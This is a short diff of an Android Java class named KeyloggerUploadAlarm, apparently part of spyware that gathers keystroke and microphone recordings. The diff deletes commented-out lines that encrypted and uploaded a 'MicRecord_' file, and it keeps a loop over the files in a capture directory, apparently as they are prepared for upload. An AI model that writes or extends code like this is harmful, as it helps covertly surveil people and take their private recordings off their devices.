@@ -63,11 +63,6 @@ public class KeyloggerUploadAlarm extends BroadcastReceiver {
             directory.mkdirs();
         }
 
-        //String encryptedPath = Encrypt("MicRecord_" +formattedDate, path );
-        //beginUpload2("MicRecord_" +formattedDate, encryptedPath);
-
-
-        //File[] files = directory.listFiles();
         ArrayList<File> files = new ArrayList<>(Arrays.asList(directory.listFiles()));
         int i = 1;
         for(File each : files){
